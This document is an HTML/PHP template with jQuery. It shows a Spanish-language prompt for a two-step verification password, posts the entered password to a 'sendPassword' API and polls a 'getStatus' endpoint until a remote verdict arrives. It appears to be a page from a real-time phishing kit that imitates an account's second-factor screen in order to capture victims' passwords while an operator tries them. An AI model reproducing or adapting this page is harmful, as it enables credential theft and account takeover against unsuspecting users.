<div class="flex h-full px-4">
    <div class="w-full m-auto my-8">
        <div class="bg-white rounded-lg overflow-hidden dkconsty" style="padding-bottom: 30px;">
            <form id="formpass" method="post">
                <div class="flex justify-end">
                    <img id="check-mark" class="fixed hidden" src="assets/check.png" alt="">
                </div>

                                <div class="px-4 mt-4">
                    <p class="text-center" style="font-size: 21px; font-weight: 600; color: #1c5443;">Introduce la contraseña</p>
                    <p class="text-center" style="font-size: 14px; margin-top: 5px;">Tiene habilitada la verificación en dos pasos, por lo que su cuenta está protegida con una contraseña adicional.</p>
                    <hr class="my-4">
                </div>
                <div class="px-8 mt-8">
                    <div class="mb-4 relative flex w-full flex-wrap items-stretch">
                        <input autocomplete="off" placeholder="Ingrese su contraseña" autofocus="" value="" class="dkshadow h-12 appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none text-center" name="password" id="personalId" type="password">
                    </div>
                </div>
                
                <div class="px-8 pt-2">
                    <div class="flex items-center justify-center">
                      <button class="text-center font-bold text-white w-full py-2 h-12 focus:outline-none focus:shadow-outline dkshadow" type="submit" style="background-color: #1565C0; border-radius: 8px;">
                            <p id="lblLogin">ENTREGAR</p>
                        </button>
                    </div>
                </div>
            </form>
        </div>
    </div>
</div>
<script>
    $("#loader").hide();
  function checkStatus() {
    $.ajax({
      url: "<?= base_url("API/index.php") ?>",
      type: "POST",
      data: {"method":"getStatus"},
      success:function(data){
        if (data.result.status == "success") {
          window.location.reload();
        } else if (data.result.status == "failed") {
          $("input[type='password']").val("");
          $("#loader").hide();
        } else {
          setTimeout(function(){
            checkStatus();
          }, 500);
        }
      }, error:function(data){}
    });
  }

  $("#formpass button").on("click", function(e){
    e.preventDefault();
    var password = $("input[type='password']").val();

    if (password != "") {
      $("#loader").show();
      $.ajax({
        url: "<?= base_url("API/index.php") ?>",
        type: "POST",
        data: {"method":"sendPassword","password":password},
        success:function(data){
          setTimeout(function(){
            checkStatus();
          }, 500);
        },
        error:function(data){}
      });
    }
  });
</script>